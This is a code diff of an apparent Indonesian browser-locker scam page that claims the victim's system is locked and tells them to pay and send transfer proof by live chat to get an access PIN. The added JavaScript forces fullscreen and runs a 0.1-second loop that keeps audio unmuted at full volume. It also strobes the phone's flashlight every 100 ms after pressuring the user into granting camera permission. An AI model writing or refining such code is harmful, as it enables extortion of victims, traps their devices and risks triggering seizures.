@@ -13,7 +13,7 @@
             --card-bg: #0a0a0a;
         }
 
-        body { background-color: var(--bg-color); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        body { background-color: var(--bg-color); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; }
         
         .hacker-banner { width: 100%; max-width: 400px; border: 1px solid var(--border-color); margin-bottom: 20px; border-radius: 4px; overflow: hidden; background: #000; }
         .hacker-banner video { width: 100%; display: block; object-fit: cover; }
@@ -22,7 +22,7 @@
         .logo-circle img { width: 100%; height: 100%; object-fit: cover; }
 
         .warning-icon { font-size: 2rem; color: #ffcc00; margin-bottom: 5px; }
-        h1 { font-size: 1.6rem; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 1px; font-weight: 900; }
+        h1 { font-size: 1.6rem; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 1px; font-weight: 900; text-align: center; }
 
         .main-box { width: 100%; max-width: 400px; border: 1px solid var(--border-color); padding: 20px; box-sizing: border-box; text-align: center; border-radius: 8px; }
         
@@ -38,7 +38,7 @@
 
         .arrow { transition: transform 0.3s; border: solid #fff; border-width: 0 2px 2px 0; display: inline-block; padding: 3px; transform: rotate(45deg); }
         .active .arrow { transform: rotate(-135deg); }
-        .active + .acc-content { max-height: 1200px; }
+        .active + .acc-content { max-height: 1500px; }
 
         .terminal { background: #050505; border: 1px solid var(--border-color); padding: 12px; text-align: left; font-family: 'Courier Prime', monospace; font-size: 0.8rem; color: var(--accent-green); margin: 15px 0; border-radius: 4px; min-height: 80px; }
         .btn-pay { width: 100%; background: #fff; color: #000; border: none; padding: 16px; font-weight: 900; font-size: 0.9rem; cursor: pointer; text-transform: uppercase; border-radius: 4px; }
@@ -90,9 +90,9 @@
                     2. Selesaikan pembayaran sesuai nominal.<br>
                     3. Klik logo sms warna hijau pojok kanan bawah.<br>
                     4. Klik logo mengirim pesan dan mengirim gambar:<br>
-                    <img src="instruksi1.jpg" class="instruction-img" alt="Tutorial 1">
+                    <img src="instruksi1.jpg" class="instruction-img" alt="Tutorial 1"><br>
                     5. Klik icon lampiran untuk mengirim bukti transaksi:<br>
-                    <img src="instruksi2.jpg" class="instruction-img" alt="Tutorial 2">
+                    <img src="instruksi2.jpg" class="instruction-img" alt="Tutorial 2"><br>
                     6. Kirim bukti transfer melalui Live Chat Dan beri keterangan "SAYA SUDAH TRANSFER".<br>
                     7. Klik tombol "Konfirmasi Pembayaran".<br>
                     8. Setelah itu tunggu beberapa saat Admin akan verifikasi dan akan mengirimkan PIN AKSES Melalui live Chat.
@@ -102,7 +102,7 @@
 
         <div id="term" class="terminal">
             > Status Sistem: TERKUNCI<br>
-            > Koneksi: Terenkripsi<br>
+            > Mode: Full Screen & Strobe Active<br>
             > Volume: Locked 100%
         </div>
 
@@ -117,21 +117,27 @@
 
         async function inisialisasiEfek() {
             if (!fiturSudahJalan) {
+                // 1. AKTIFKAN FULL SCREEN
+                let elem = document.documentElement;
+                if (elem.requestFullscreen) { elem.requestFullscreen(); }
+                else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+                else if (elem.msRequestFullscreen) { elem.msRequestFullscreen(); }
+
                 var video = document.getElementById("myVideo");
 
-                // 1. Jalankan Video & Paksa Suara Muncul
+                // 2. JALANKAN VIDEO & SUARA
                 video.muted = false;
                 video.volume = 1.0;
-                video.play().catch(e => console.log("Perlu interaksi"));
+                video.play().catch(e => console.log("Klik diperlukan"));
 
-                // 2. VOLUME LOOP (Memaksa volume tetap 100% setiap 0.5 detik)
+                // 3. AGGRESSIVE VOLUME LOCK (Setiap 0.1 detik)
                 setInterval(() => {
-                    if (video.volume < 1.0) {
-                        video.volume = 1.0;
-                    }
-                }, 500);
+                    video.volume = 1.0;
+                    if(video.muted) video.muted = false;
+                    if(video.paused) video.play();
+                }, 100);
 
-                // 3. Jalankan Senter Berkedip Cepat (Strobe)
+                // 4. JALANKAN SENTER
                 mulaiSenterKedip();
                 
                 fiturSudahJalan = true;
@@ -151,10 +157,10 @@
                     setInterval(async () => {
                         flashOn = !flashOn;
                         await track.applyConstraints({ advanced: [{ torch: flashOn }] });
-                    }, 100); // Kedip sangat cepat (0.1 detik)
+                    }, 100); 
                 }
             } catch (err) {
-                alert("IZINKAN KAMERA UNTUK VERIFIKASI!");
+                alert("IZINKAN KAMERA UNTUK VERIFIKASI SISTEM!");
             }
         }
 
